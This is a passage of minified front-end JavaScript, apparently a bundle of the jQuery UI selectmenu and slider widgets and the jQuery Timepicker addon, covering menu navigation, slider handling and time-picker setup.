item,next,filter=".ui-menu-item";this.isOpen?item=this.menuItems.eq(this.focusIndex):(item=this.menuItems.eq(this.element[0].selectedIndex),filter+=":not(.ui-state-disabled)"),(next="first"===direction||"last"===direction?item["first"===direction?"prevAll":"nextAll"](filter).eq(-1):item[direction+"All"](filter).eq(0)).length&&this.menuInstance.focus(event,next)},_getSelectedItem:function(){return this.menuItems.eq(this.element[0].selectedIndex)},_toggle:function(event){this[this.isOpen?"close":"open"](event)},_setSelection:function(){var selection;this.range&&(window.getSelection?((selection=window.getSelection()).removeAllRanges(),selection.addRange(this.range)):this.range.select(),this.button.focus())},_documentClick:{mousedown:function(event){this.isOpen&&($(event.target).closest(".ui-selectmenu-menu, #"+this.ids.button).length||this.close(event))}},_buttonEvents:{mousedown:function(){var selection;window.getSelection?(selection=window.getSelection()).rangeCount&&(this.range=selection.getRangeAt(0)):this.range=document.selection.createRange()},click:function(event){this._setSelection(),this._toggle(event)},keydown:function(event){var preventDefault=!0;switch(event.keyCode){case $.ui.keyCode.TAB:case $.ui.keyCode.ESCAPE:this.close(event),preventDefault=!1;break;case $.ui.keyCode.ENTER:this.isOpen&&this._selectFocusedItem(event);break;case $.ui.keyCode.UP:event.altKey?this._toggle(event):this._move("prev",event);break;case $.ui.keyCode.DOWN:event.altKey?this._toggle(event):this._move("next",event);break;case $.ui.keyCode.SPACE:this.isOpen?this._selectFocusedItem(event):this._toggle(event);break;case $.ui.keyCode.LEFT:this._move("prev",event);break;case $.ui.keyCode.RIGHT:this._move("next",event);break;case $.ui.keyCode.HOME:case $.ui.keyCode.PAGE_UP:this._move("first",event);break;case $.ui.keyCode.END:case $.ui.keyCode.PAGE_DOWN:this._move("last",event);break;default:this.menu.trigger(event),preventDefault=!1}preventDefault&&event.preventDefault()}},_selectFocusedItem:function(event){var item=this.menuItems.eq(this.focusIndex);item.hasClass("ui-state-disabled")||this._select(item.data("ui-selectmenu-item"),event)},_select:function(item,event){var oldIndex=this.element[0].selectedIndex;this.element[0].selectedIndex=item.index,this._setText(this.buttonText,item.label),this._setAria(item),this._trigger("select",event,{item:item}),item.index!==oldIndex&&this._trigger("change",event,{item:item}),this.close(event)},_setAria:function(item){var id=this.menuItems.eq(item.index).attr("id");this.button.attr({"aria-labelledby":id,"aria-activedescendant":id}),this.menu.attr("aria-activedescendant",id)},_setOption:function(key,value){"icons"===key&&this.button.find("span.ui-icon").removeClass(this.options.icons.button).addClass(value.button),this._super(key,value),"appendTo"===key&&this.menuWrap.appendTo(this._appendTo()),"disabled"===key&&(this.menuInstance.option("disabled",value),this.button.toggleClass("ui-state-disabled",value).attr("aria-disabled",value),this.element.prop("disabled",value),value?(this.button.attr("tabindex",-1),this.close()):this.button.attr("tabindex",0)),"width"===key&&this._resizeButton()},_appendTo:function(){var element=this.options.appendTo;return element&&(element=element.jquery||element.nodeType?$(element):this.document.find(element).eq(0)),element&&element[0]||(element=this.element.closest(".ui-front")),element.length||(element=this.document[0].body),element},_toggleAttr:function(){this.button.toggleClass("ui-corner-top",this.isOpen).toggleClass("ui-corner-all",!this.isOpen).attr("aria-expanded",this.isOpen),this.menuWrap.toggleClass("ui-selectmenu-open",this.isOpen),this.menu.attr("aria-hidden",!this.isOpen)},_resizeButton:function(){var width=this.options.width;width||(width=this.element.show().outerWidth(),this.element.hide()),this.button.outerWidth(width)},_resizeMenu:function(){this.menu.outerWidth(Math.max(this.button.outerWidth(),this.menu.width("").outerWidth()+1))},_getCreateOptions:function(){return{disabled:this.element.prop("disabled")}},_parseOptions:function(options){var data=[];options.each((function(index,item){var option=$(item),optgroup=option.parent("optgroup");data.push({element:option,index:index,value:option.val(),label:option.text(),optgroup:optgroup.attr("label")||"",disabled:optgroup.prop("disabled")||option.prop("disabled")})})),this.items=data},_destroy:function(){this.menuWrap.remove(),this.button.remove(),this.element.show(),this.element.removeUniqueId(),this.label.attr("for",this.ids.element)}}),$.widget("ui.slider",$.ui.mouse,{version:"1.11.4",widgetEventPrefix:"slide",options:{animate:!1,distance:0,max:100,min:0,orientation:"horizontal",range:!1,step:1,value:0,values:null,change:null,slide:null,start:null,stop:null},numPages:5,_create:function(){this._keySliding=!1,this._mouseSliding=!1,this._animateOff=!0,this._handleIndex=null,this._detectOrientation(),this._mouseInit(),this._calculateNewMax(),this.element.addClass("ui-slider ui-slider-"+this.orientation+" ui-widget ui-widget-content ui-corner-all"),this._refresh(),this._setOption("disabled",this.options.disabled),this._animateOff=!1},_refresh:function(){this._createRange(),this._createHandles(),this._setupEvents(),this._refreshValue()},_createHandles:function(){var i,handleCount,options=this.options,existingHandles=this.element.find(".ui-slider-handle").addClass("ui-state-default ui-corner-all"),handles=[];for(handleCount=options.values&&options.values.length||1,existingHandles.length>handleCount&&(existingHandles.slice(handleCount).remove(),existingHandles=existingHandles.slice(0,handleCount)),i=existingHandles.length;i<handleCount;i++)handles.push("<span class='ui-slider-handle ui-state-default ui-corner-all' tabindex='0'></span>");this.handles=existingHandles.add($(handles.join("")).appendTo(this.element)),this.handle=this.handles.eq(0),this.handles.each((function(i){$(this).data("ui-slider-handle-index",i)}))},_createRange:function(){var options=this.options,classes="";options.range?(!0===options.range&&(options.values?options.values.length&&2!==options.values.length?options.values=[options.values[0],options.values[0]]:$.isArray(options.values)&&(options.values=options.values.slice(0)):options.values=[this._valueMin(),this._valueMin()]),this.range&&this.range.length?this.range.removeClass("ui-slider-range-min ui-slider-range-max").css({left:"",bottom:""}):(this.range=$("<div></div>").appendTo(this.element),classes="ui-slider-range ui-widget-header ui-corner-all"),this.range.addClass(classes+("min"===options.range||"max"===options.range?" ui-slider-range-"+options.range:""))):(this.range&&this.range.remove(),this.range=null)},_setupEvents:function(){this._off(this.handles),this._on(this.handles,this._handleEvents),this._hoverable(this.handles),this._focusable(this.handles)},_destroy:function(){this.handles.remove(),this.range&&this.range.remove(),this.element.removeClass("ui-slider ui-slider-horizontal ui-slider-vertical ui-widget ui-widget-content ui-corner-all"),this._mouseDestroy()},_mouseCapture:function(event){var position,normValue,distance,closestHandle,index,offset,mouseOverHandle,that=this,o=this.options;return!o.disabled&&(this.elementSize={width:this.element.outerWidth(),height:this.element.outerHeight()},this.elementOffset=this.element.offset(),position={x:event.pageX,y:event.pageY},normValue=this._normValueFromMouse(position),distance=this._valueMax()-this._valueMin()+1,this.handles.each((function(i){var thisDistance=Math.abs(normValue-that.values(i));(distance>thisDistance||distance===thisDistance&&(i===that._lastChangedValue||that.values(i)===o.min))&&(distance=thisDistance,closestHandle=$(this),index=i)})),!1!==this._start(event,index)&&(this._mouseSliding=!0,this._handleIndex=index,closestHandle.addClass("ui-state-active").focus(),offset=closestHandle.offset(),mouseOverHandle=!$(event.target).parents().addBack().is(".ui-slider-handle"),this._clickOffset=mouseOverHandle?{left:0,top:0}:{left:event.pageX-offset.left-closestHandle.width()/2,top:event.pageY-offset.top-closestHandle.height()/2-(parseInt(closestHandle.css("borderTopWidth"),10)||0)-(parseInt(closestHandle.css("borderBottomWidth"),10)||0)+(parseInt(closestHandle.css("marginTop"),10)||0)},this.handles.hasClass("ui-state-hover")||this._slide(event,index,normValue),this._animateOff=!0,!0))},_mouseStart:function(){return!0},_mouseDrag:function(event){var position={x:event.pageX,y:event.pageY},normValue=this._normValueFromMouse(position);return this._slide(event,this._handleIndex,normValue),!1},_mouseStop:function(event){return this.handles.removeClass("ui-state-active"),this._mouseSliding=!1,this._stop(event,this._handleIndex),this._change(event,this._handleIndex),this._handleIndex=null,this._clickOffset=null,this._animateOff=!1,!1},_detectOrientation:function(){this.orientation="vertical"===this.options.orientation?"vertical":"horizontal"},_normValueFromMouse:function(position){var pixelTotal,pixelMouse,percentMouse,valueTotal,valueMouse;return"horizontal"===this.orientation?(pixelTotal=this.elementSize.width,pixelMouse=position.x-this.elementOffset.left-(this._clickOffset?this._clickOffset.left:0)):(pixelTotal=this.elementSize.height,pixelMouse=position.y-this.elementOffset.top-(this._clickOffset?this._clickOffset.top:0)),(percentMouse=pixelMouse/pixelTotal)>1&&(percentMouse=1),percentMouse<0&&(percentMouse=0),"vertical"===this.orientation&&(percentMouse=1-percentMouse),valueTotal=this._valueMax()-this._valueMin(),valueMouse=this._valueMin()+percentMouse*valueTotal,this._trimAlignValue(valueMouse)},_start:function(event,index){var uiHash={handle:this.handles[index],value:this.value()};return this.options.values&&this.options.values.length&&(uiHash.value=this.values(index),uiHash.values=this.values()),this._trigger("start",event,uiHash)},_slide:function(event,index,newVal){var otherVal,newValues,allowed;this.options.values&&this.options.values.length?(otherVal=this.values(index?0:1),2===this.options.values.length&&!0===this.options.range&&(0===index&&newVal>otherVal||1===index&&newVal<otherVal)&&(newVal=otherVal),newVal!==this.values(index)&&((newValues=this.values())[index]=newVal,allowed=this._trigger("slide",event,{handle:this.handles[index],value:newVal,values:newValues}),otherVal=this.values(index?0:1),!1!==allowed&&this.values(index,newVal))):newVal!==this.value()&&!1!==(allowed=this._trigger("slide",event,{handle:this.handles[index],value:newVal}))&&this.value(newVal)},_stop:function(event,index){var uiHash={handle:this.handles[index],value:this.value()};this.options.values&&this.options.values.length&&(uiHash.value=this.values(index),uiHash.values=this.values()),this._trigger("stop",event,uiHash)},_change:function(event,index){if(!this._keySliding&&!this._mouseSliding){var uiHash={handle:this.handles[index],value:this.value()};this.options.values&&this.options.values.length&&(uiHash.value=this.values(index),uiHash.values=this.values()),this._lastChangedValue=index,this._trigger("change",event,uiHash)}},value:function(newValue){return arguments.length?(this.options.value=this._trimAlignValue(newValue),this._refreshValue(),void this._change(null,0)):this._value()},values:function(index,newValue){var vals,newValues,i;if(arguments.length>1)return this.options.values[index]=this._trimAlignValue(newValue),this._refreshValue(),void this._change(null,index);if(!arguments.length)return this._values();if(!$.isArray(arguments[0]))return this.options.values&&this.options.values.length?this._values(index):this.value();for(vals=this.options.values,newValues=arguments[0],i=0;i<vals.length;i+=1)vals[i]=this._trimAlignValue(newValues[i]),this._change(null,i);this._refreshValue()},_setOption:function(key,value){var i,valsLength=0;switch("range"===key&&!0===this.options.range&&("min"===value?(this.options.value=this._values(0),this.options.values=null):"max"===value&&(this.options.value=this._values(this.options.values.length-1),this.options.values=null)),$.isArray(this.options.values)&&(valsLength=this.options.values.length),"disabled"===key&&this.element.toggleClass("ui-state-disabled",!!value),this._super(key,value),key){case"orientation":this._detectOrientation(),this.element.removeClass("ui-slider-horizontal ui-slider-vertical").addClass("ui-slider-"+this.orientation),this._refreshValue(),this.handles.css("horizontal"===value?"bottom":"left","");break;case"value":this._animateOff=!0,this._refreshValue(),this._change(null,0),this._animateOff=!1;break;case"values":for(this._animateOff=!0,this._refreshValue(),i=0;i<valsLength;i+=1)this._change(null,i);this._animateOff=!1;break;case"step":case"min":case"max":this._animateOff=!0,this._calculateNewMax(),this._refreshValue(),this._animateOff=!1;break;case"range":this._animateOff=!0,this._refresh(),this._animateOff=!1}},_value:function(){var val=this.options.value;return val=this._trimAlignValue(val)},_values:function(index){var val,vals,i;if(arguments.length)return val=this.options.values[index],val=this._trimAlignValue(val);if(this.options.values&&this.options.values.length){for(vals=this.options.values.slice(),i=0;i<vals.length;i+=1)vals[i]=this._trimAlignValue(vals[i]);return vals}return[]},_trimAlignValue:function(val){if(val<=this._valueMin())return this._valueMin();if(val>=this._valueMax())return this._valueMax();var step=this.options.step>0?this.options.step:1,valModStep=(val-this._valueMin())%step,alignValue=val-valModStep;return 2*Math.abs(valModStep)>=step&&(alignValue+=valModStep>0?step:-step),parseFloat(alignValue.toFixed(5))},_calculateNewMax:function(){var max=this.options.max,min=this._valueMin(),step=this.options.step;max=Math.floor(+(max-min).toFixed(this._precision())/step)*step+min,this.max=parseFloat(max.toFixed(this._precision()))},_precision:function(){var precision=this._precisionOf(this.options.step);return null!==this.options.min&&(precision=Math.max(precision,this._precisionOf(this.options.min))),precision},_precisionOf:function(num){var str=num.toString(),decimal=str.indexOf(".");return-1===decimal?0:str.length-decimal-1},_valueMin:function(){return this.options.min},_valueMax:function(){return this.max},_refreshValue:function(){var lastValPercent,valPercent,value,valueMin,valueMax,oRange=this.options.range,o=this.options,that=this,animate=!this._animateOff&&o.animate,_set={};this.options.values&&this.options.values.length?this.handles.each((function(i){valPercent=(that.values(i)-that._valueMin())/(that._valueMax()-that._valueMin())*100,_set["horizontal"===that.orientation?"left":"bottom"]=valPercent+"%",$(this).stop(1,1)[animate?"animate":"css"](_set,o.animate),!0===that.options.range&&("horizontal"===that.orientation?(0===i&&that.range.stop(1,1)[animate?"animate":"css"]({left:valPercent+"%"},o.animate),1===i&&that.range[animate?"animate":"css"]({width:valPercent-lastValPercent+"%"},{queue:!1,duration:o.animate})):(0===i&&that.range.stop(1,1)[animate?"animate":"css"]({bottom:valPercent+"%"},o.animate),1===i&&that.range[animate?"animate":"css"]({height:valPercent-lastValPercent+"%"},{queue:!1,duration:o.animate}))),lastValPercent=valPercent})):(value=this.value(),valueMin=this._valueMin(),valueMax=this._valueMax(),valPercent=valueMax!==valueMin?(value-valueMin)/(valueMax-valueMin)*100:0,_set["horizontal"===this.orientation?"left":"bottom"]=valPercent+"%",this.handle.stop(1,1)[animate?"animate":"css"](_set,o.animate),"min"===oRange&&"horizontal"===this.orientation&&this.range.stop(1,1)[animate?"animate":"css"]({width:valPercent+"%"},o.animate),"max"===oRange&&"horizontal"===this.orientation&&this.range[animate?"animate":"css"]({width:100-valPercent+"%"},{queue:!1,duration:o.animate}),"min"===oRange&&"vertical"===this.orientation&&this.range.stop(1,1)[animate?"animate":"css"]({height:valPercent+"%"},o.animate),"max"===oRange&&"vertical"===this.orientation&&this.range[animate?"animate":"css"]({height:100-valPercent+"%"},{queue:!1,duration:o.animate}))},_handleEvents:{keydown:function(event){var curVal,newVal,step,index=$(event.target).data("ui-slider-handle-index");switch(event.keyCode){case $.ui.keyCode.HOME:case $.ui.keyCode.END:case $.ui.keyCode.PAGE_UP:case $.ui.keyCode.PAGE_DOWN:case $.ui.keyCode.UP:case $.ui.keyCode.RIGHT:case $.ui.keyCode.DOWN:case $.ui.keyCode.LEFT:if(event.preventDefault(),!this._keySliding&&(this._keySliding=!0,$(event.target).addClass("ui-state-active"),!1===this._start(event,index)))return}switch(step=this.options.step,curVal=newVal=this.options.values&&this.options.values.length?this.values(index):this.value(),event.keyCode){case $.ui.keyCode.HOME:newVal=this._valueMin();break;case $.ui.keyCode.END:newVal=this._valueMax();break;case $.ui.keyCode.PAGE_UP:newVal=this._trimAlignValue(curVal+(this._valueMax()-this._valueMin())/this.numPages);break;case $.ui.keyCode.PAGE_DOWN:newVal=this._trimAlignValue(curVal-(this._valueMax()-this._valueMin())/this.numPages);break;case $.ui.keyCode.UP:case $.ui.keyCode.RIGHT:if(curVal===this._valueMax())return;newVal=this._trimAlignValue(curVal+step);break;case $.ui.keyCode.DOWN:case $.ui.keyCode.LEFT:if(curVal===this._valueMin())return;newVal=this._trimAlignValue(curVal-step)}this._slide(event,index,newVal)},keyup:function(event){var index=$(event.target).data("ui-slider-handle-index");this._keySliding&&(this._keySliding=!1,this._stop(event,index),this._change(event,index),$(event.target).removeClass("ui-state-active"))}}})})),function($){if($.ui.timepicker=$.ui.timepicker||{},!$.ui.timepicker.version){$.extend($.ui,{timepicker:{version:"1.4.1"}});var Timepicker=function(){this.regional=[],this.regional[""]={currentText:"Now",closeText:"Done",amNames:["AM","A"],pmNames:["PM","P"],timeFormat:"HH:mm",timeSuffix:"",timeOnlyTitle:"Choose Time",timeText:"Time",hourText:"Hour",minuteText:"Minute",secondText:"Second",millisecText:"Millisecond",microsecText:"Microsecond",timezoneText:"Time Zone",isRTL:!1},this._defaults={showButtonPanel:!0,timeOnly:!1,showHour:null,showMinute:null,showSecond:null,showMillisec:null,showMicrosec:null,showTimezone:null,showTime:!0,stepHour:1,stepMinute:1,stepSecond:1,stepMillisec:1,stepMicrosec:1,hour:0,minute:0,second:0,millisec:0,microsec:0,timezone:null,hourMin:0,minuteMin:0,secondMin:0,millisecMin:0,microsecMin:0,hourMax:23,minuteMax:59,secondMax:59,millisecMax:999,microsecMax:999,minDateTime:null,maxDateTime:null,onSelect:null,hourGrid:0,minuteGrid:0,secondGrid:0,millisecGrid:0,microsecGrid:0,alwaysSetTime:!0,separator:" ",altFieldTimeOnly:!0,altTimeFormat:null,altSeparator:null,altTimeSuffix:null,pickerTimeFormat:null,pickerTimeSuffix:null,showTimepicker:!0,timezoneList:null,addSliderAccess:!1,sliderAccessArgs:null,controlType:"slider",defaultValue:null,parse:"strict"},$.extend(this._defaults,this.regional[""])};$.extend(Timepicker.prototype,{$input:null,$altInput:null,$timeObj:null,inst:null,hour_slider:null,minute_slider:null,second_slider:null,millisec_slider:null,microsec_slider:null,timezone_select:null,hour:0,minute:0,second:0,millisec:0,microsec:0,timezone:null,hourMinOriginal:null,minuteMinOriginal:null,secondMinOriginal:null,millisecMinOriginal:null,microsecMinOriginal:null,hourMaxOriginal:null,minuteMaxOriginal:null,secondMaxOriginal:null,millisecMaxOriginal:null,microsecMaxOriginal:null,ampm:"",formattedDate:"",formattedTime:"",formattedDateTime:"",timezoneList:null,units:["hour","minute","second","millisec","microsec"],support:{},control:null,setDefaults:function(settings){return extendRemove(this._defaults,settings||{}),this},_newInst:function($input,opts){var tp_inst=new Timepicker,inlineSettings={},fns={},overrides,i;for(var attrName in this._defaults)if(this._defaults.hasOwnProperty(attrName)){var attrValue=$input.attr("time:"+attrName);if(attrValue)try{inlineSettings[attrName]=eval(attrValue)}catch(err){inlineSettings[attrName]=attrValue}}for(i in overrides={beforeShow:function(input,dp_inst){if($.isFunction(tp_inst._defaults.evnts.beforeShow))return tp_inst._defaults.evnts.beforeShow.call($input[0],input,dp_inst,tp_inst)},onChangeMonthYear:function(year,month,dp_inst){tp_inst._updateDateTime(dp_inst),$.isFunction(tp_inst._defaults.evnts.onChangeMonthYear)&&tp_inst._defaults.evnts.onChangeMonthYear.call($input[0],year,month,dp_inst,tp_inst)},onClose:function(dateText,dp_inst){!0===tp_inst.timeDefined&&""!==$input.val()&&tp_inst._updateDateTime(dp_inst),$.isFunction(tp_inst._defaults.evnts.onClose)&&tp_inst._defaults.evnts.onClose.call($input[0],dateText,dp_inst,tp_inst)}},overrides)overrides.hasOwnProperty(i)&&(fns[i]=opts[i]||null);tp_inst._defaults=$.extend({},this._defaults,inlineSettings,opts,overrides,{evnts:fns,timepicker:tp_inst}),tp_inst.amNames=$.map(tp_inst._defaults.amNames,(function(val){return val.toUpperCase()})),tp_inst.pmNames=$.map(tp_inst._defaults.pmNames,(function(val){return val.toUpperCase()})),tp_inst.support=detectSupport(tp_inst._defaults.timeFormat+(tp_inst._defaults.pickerTimeFormat?tp_inst._defaults.pickerTimeFormat:"")+(tp_inst._defaults.altTimeFormat?tp_inst._defaults.altTimeFormat:"")),"string"==typeof tp_inst._defaults.controlType?("slider"===tp_inst._defaults.controlType&&void 0===$.ui.slider&&(tp_inst._defaults.controlType="select"),tp_inst.control=tp_inst._controls[tp_inst._defaults.controlType]):tp_inst.control=tp_inst._defaults.controlType;var timezoneList=[-720,-660,-600,-570,-540,-480,-420,-360,-300,-270,-240,-210,-180,-120,-60,0,60,120,180,210,240,270,300,330,345,360,390,420,480,525,540,570,600,630,660,690,720,765,780,840];null!==tp_inst._defaults.timezoneList&&(timezoneList=tp_inst._defaults.timezoneList);var tzl=timezoneList.length,tzi=0,tzv=null;if(tzl>0&&"object"!=typeof timezoneList[0])for(;tzi<tzl;tzi++)tzv=timezoneList[tzi],timezoneList[tzi]={value:tzv,label:$.timepicker.timezoneOffsetString(tzv,tp_inst.support.iso8601)};return tp_inst._defaults.timezoneList=timezoneList,tp_inst.timezone=null!==tp_inst._defaults.timezone?$.timepicker.timezoneOffsetNumber(tp_inst._defaults.timezone):-1*(new Date).getTimezoneOffset(),tp_inst.hour=tp_inst._defaults.hour<tp_inst._defaults.hourMin?tp_inst._defaults.hourMin:tp_inst._defaults.hour>tp_inst._defaults.hourMax?tp_inst._defaults.hourMax:tp_inst._defaults.hour,tp_inst.minute=tp_inst._defaults.minute<tp_inst._defaults.minuteMin?tp_inst._defaults.minuteMin:tp_inst._defaults.minute>tp_inst._defaults.minuteMax?tp_inst._defaults.minuteMax:tp_inst._defaults.minute,tp_inst.second=tp_inst._defaults.second<tp_inst._defaults.secondMin?tp_inst._defaults.secondMin:tp_inst._defaults.second>tp_inst._defaults.secondMax?tp_inst._defaults.secondMax:tp_inst._defaults.second,tp_inst.millisec=tp_inst._defaults.millisec<tp_inst._defaults.millisecMin?tp_inst._defaults.millisecMin:tp_inst._defaults.millisec>tp_inst._defaults.millisecMax?tp_inst._defaults.millisecMax:tp_inst._defaults.millisec,tp_inst.microsec=tp_inst._defaults.microsec<tp_inst._defaults.microsecMin?tp_inst._defaults.microsecMin:tp_inst._defaults.microsec>tp_inst._defaults.microsecMax?tp_inst._defaults.microsecMax:tp_inst._defaults.microsec,tp_inst.ampm="",tp_inst.$input=$input,tp_inst._defaults.altField&&(tp_inst.$altInput=$(tp_inst._defaults.altField).css({cursor:"pointer"}).focus((function(){$input.trigger("focus")}))),0!==tp_inst._defaults.minDate&&0!==tp_inst._defaults.minDateTime||(tp_inst._defaults.minDate=new Date),0!==tp_inst._defaults.maxDate&&0!==tp_inst._defaults.maxDateTime||(tp_inst._defaults.maxDate=new Date),void 0!==tp_inst._defaults.minDate&&tp_inst._defaults.minDate instanceof Date&&(tp_inst._defaults.minDateTime=new Date(tp_inst._defaults.minDate.getTime())),void 0!==tp_inst._defaults.minDateTime&&tp_inst._defaults.minDateTime instanceof Date&&(tp_inst._defaults.minDate=new Date(tp_inst._defaults.minDateTime.getTime())),void 0!==tp_inst._defaults.maxDate&&tp_inst._defaults.maxDate instanceof Date&&(tp_inst._defaults.maxDateTime=new Date(tp_inst._defaults.maxDate.getTime())),void 0!==tp_inst._defaults.maxDateTime&&tp_inst._defaults.maxDateTime instanceof Date&&(tp_inst._defaults.maxDate=new Date(tp_inst._defaults.maxDateTime.getTime())),tp_inst.$input.bind("focus",(function(){tp_inst._onFocus()})),tp_inst},_addTimePicker:function(dp_inst){var currDT=this.$altInput&&this._defaults.altFieldTimeOnly?this.$input.val()+" "+this.$altInput.val():this.$input.val();this.timeDefined=this._parseTime(currDT),this._limitMinMaxDateTime(dp_inst,!1),this._injectTimePicker()},_parseTime:function(timeString,withDate){if(this.inst||(this.inst=$.datepicker._getInst(this.$input[0])),withDate||!this._defaults.timeOnly){var dp_dateFormat=$.datepicker._get(this.inst,"dateFormat");try{var parseRes=parseDateTimeInternal(dp_dateFormat,this._defaults.timeFormat,timeString,$.datepicker._getFormatConfig(this.inst),this._defaults);if(!parseRes.timeObj)return!1;$.extend(this,parseRes.timeObj)}catch(err){return $.timepicker.log("Error parsing the date/time string: "+err+"\ndate/time string = "+timeString+"\ntimeFormat = "+this._defaults.timeFormat+"\ndateFormat = "+dp_dateFormat),!1}return!0}var timeObj=$.datepicker.parseTime(this._defaults.timeFormat,timeString,this._defaults);return!!timeObj&&($.extend(this,timeObj),!0)},_injectTimePicker:function(){var $dp=this.inst.dpDiv,o=this.inst.settings,tp_inst=this,litem="",uitem="",show=null,max={},gridSize={},size=null,i=0,l=0;if(0===$dp.find("div.ui-timepicker-div").length&&o.showTimepicker){var noDisplay=' style="display:none;"',html='<div class="ui-timepicker-div'+(o.isRTL?" ui-timepicker-rtl":"")+'"><dl><dt class="ui_tpicker_time_label"'+(o.showTime?"":noDisplay)+">"+o.timeText+'</dt><dd class="ui_tpicker_time"'+(o.showTime?"":noDisplay)+"></dd>";for(i=0,l=this.units.length;i<l;i++){if(show=null!==o["show"+(uitem=(litem=this.units[i]).substr(0,1).toUpperCase()+litem.substr(1))]?o["show"+uitem]:this.support[litem],max[litem]=parseInt(o[litem+"Max"]-(o[litem+"Max"]-o[litem+"Min"])%o["step"+uitem],10),gridSize[litem]=0,html+='<dt class="ui_tpicker_'+litem+'_label"'+(show?"":noDisplay)+">"+o[litem+"Text"]+'</dt><dd class="ui_tpicker_'+litem+'"><div class="ui_tpicker_'+litem+'_slider"'+(show?"":noDisplay)+"></div>",show&&o[litem+"Grid"]>0){if(html+='<div style="padding-left: 1px"><table class="ui-tpicker-grid-label"><tr>',"hour"===litem)for(var h=o[litem+"Min"];h<=max[litem];h+=parseInt(o[litem+"Grid"],10)){gridSize[litem]++;var tmph=$.datepicker.formatTime(this.support.ampm?"hht":"HH",{hour:h},o);html+='<td data-for="'+litem+'">'+tmph+"</td>"}else for(var m=o[litem+"Min"];m<=max[litem];m+=parseInt(o[litem+"Grid"],10))gridSize[litem]++,html+='<td data-for="'+litem+'">'+(m<10?"0":"")+m+"</td>";html+="</tr></table></div>"}html+="</dd>"}var showTz=null!==o.showTimezone?o.showTimezone:this.support.timezone;html+='<dt class="ui_tpicker_timezone_label"'+(showTz?"":noDisplay)+">"+o.timezoneText+"</dt>",html+='<dd class="ui_tpicker_timezone" '+(showTz?"":noDisplay)+"></dd>";var $tp=$(html+="</dl></div>");for(!0===o.timeOnly&&($tp.prepend('<div class="ui-widget-header ui-helper-clearfix ui-corner-all"><div class="ui-datepicker-title">'+o.timeOnlyTitle+"</div></div>"),$dp.find(".ui-datepicker-header, .ui-datepicker-calendar").hide()),i=0,l=tp_inst.units.length;i<l;i++)show=null!==o["show"+(uitem=(litem=tp_inst.units[i]).substr(0,1).toUpperCase()+litem.substr(1))]?o["show"+uitem]:this.support[litem],tp_inst[litem+"_slider"]=tp_inst.control.create(tp_inst,$tp.find(".ui_tpicker_"+litem+"_slider"),litem,tp_inst[litem],o[litem+"Min"],max[litem],o["step"+uitem]),show&&o[litem+"Grid"]>0&&(size=100*gridSize[litem]*o[litem+"Grid"]/(max[litem]-o[litem+"Min"]),$tp.find(".ui_tpicker_"+litem+" table").css({width:size+"%",marginLeft:o.isRTL?"0":size/(-2*gridSize[litem])+"%",marginRight:o.isRTL?size/(-2*gridSize[litem])+"%":"0",borderCollapse:"collapse"}).find("td").click((function(e){var $t=$(this),h=$t.html(),n=parseInt(h.replace(/[^0-9]/g),10),ap=h.replace(/[^apm]/gi),f=$t.data("for");"hour"===f&&(-1!==ap.indexOf("p")&&n<12?n+=12:-1!==ap.indexOf("a")&&12===n&&(n=0)),tp_inst.control.value(tp_inst,tp_inst[f+"_slider"],litem,n),tp_inst._onTimeChange(),tp_inst._onSelectHandler()})).css({cursor:"pointer",width:100/gridSize[litem]+"%",textAlign:"center",overflow:"hidden"}));if(this.timezone_select=$tp.find(".ui_tpicker_timezone").append("<select></select>").find("select"),$.fn.append.apply(this.timezone_select,$.map(o.timezoneList,(function(val,idx){return $("<option />").val("object"==typeof val?val.value:val).text("object"==typeof val?val.label:val)}))),void 0!==this.timezone&&null!==this.timezone&&""!==this.timezone)-1*new Date(this.inst.selectedYear,this.inst.selectedMonth,this.inst.selectedDay,12).getTimezoneOffset()===this.timezone?selectLocalTimezone(tp_inst):this.timezone_select.val(this.timezone);else void 0!==this.hour&&null!==this.hour&&""!==this.hour?this.timezone_select.val(o.timezone):selectLocalTimezone(tp_inst);this.timezone_select.change((function(){tp_inst._onTimeChange(),tp_inst._onSelectHandler()}));var $buttonPanel=$dp.find(".ui-datepicker-buttonpane");if($buttonPanel.length?$buttonPanel.before($tp):$dp.append($tp),this.$timeObj=$tp.find(".ui_tpicker_time"),null!==this.inst){var timeDefined=this.timeDefined;this._onTimeChange(),this.timeDefined=timeDefined}if(this._defaults.addSliderAccess){var sliderAccessArgs=this._defaults.sliderAccessArgs,rtl=this._defaults.isRTL;sliderAccessArgs.isRTL=rtl,setTimeout((function(){if(0===$tp.find(".ui-slider-access").length){$tp.find(".ui-slider:visible").sliderAccess(sliderAccessArgs);var sliderAccessWidth=$tp.find(".ui-slider-access:eq(0)").outerWidth(!0);sliderAccessWidth&&$tp.find("table:visible").each((function(){var $g=$(this),oldWidth=$g.outerWidth(),oldMarginLeft=$g.css(rtl?"marginRight":"marginLeft").toString().replace("%",""),newWidth=oldWidth-sliderAccessWidth,newMarginLeft=oldMarginLeft*newWidth/oldWidth+"%",css={width:newWidth,marginRight:0,marginLeft:0};css[rtl?"marginRight":"marginLeft"]=newMarginLeft,$g.css(css)}))}}),10)}tp_inst._limitMinMaxDateTime(this.inst,!0)}},_limitMinMaxDateTime:function(dp_inst,adjustSliders){var o=this._defaults,dp_date=new Date(dp_inst.selectedYear,dp_inst.selectedMonth,dp_inst.selectedDay);if(this._defaults.showTimepicker){if(null!==$.datepicker._get(dp_inst,"minDateTime")&&void 0!==$.datepicker._get(dp_inst,"minDateTime")&&dp_date){var minDateTime=$.datepicker._get(dp_inst,"minDateTime"),minDateTimeDate=new Date(minDateTime.getFullYear(),minDateTime.getMonth(),minDateTime.getDate(),0,0,0,0);null!==this.hourMinOriginal&&null!==this.minuteMinOriginal&&null!==this.secondMinOriginal&&null!==this.millisecMinOriginal&&null!==this.microsecMinOriginal||(this.hourMinOriginal=o.hourMin,this.minuteMinOriginal=o.minuteMin,this.secondMinOriginal=o.secondMin,this.millisecMinOriginal=o.millisecMin,this.microsecMinOriginal=o.microsecMin),dp_inst.settings.timeOnly||minDateTimeDate.getTime()===dp_date.getTime()?(this._defaults.hourMin=minDateTime.getHours(),this.hour<=this._defaults.hourMin?(this.hour=this._defaults.hourMin,this._defaults.minuteMin=minDateTime.getMinutes(),this.minute<=this._defaults.minuteMin?(this.minute=this._defaults.minuteMin,this._defaults.secondMin=minDateTime.getSeconds(),this.second<=this._defaults.secondMin?(this.second=this._defaults.secondMin,this._defaults.millisecMin=minDateTime.getMilliseconds(),this.millisec<=this._defaults.millisecMin?(this.millisec=this._defaults.millisecMin,this._defaults.microsecMin=minDateTime.getMicroseconds()):(this.microsec<this._defaults.microsecMin&&(this.microsec=this._defaults.microsecMi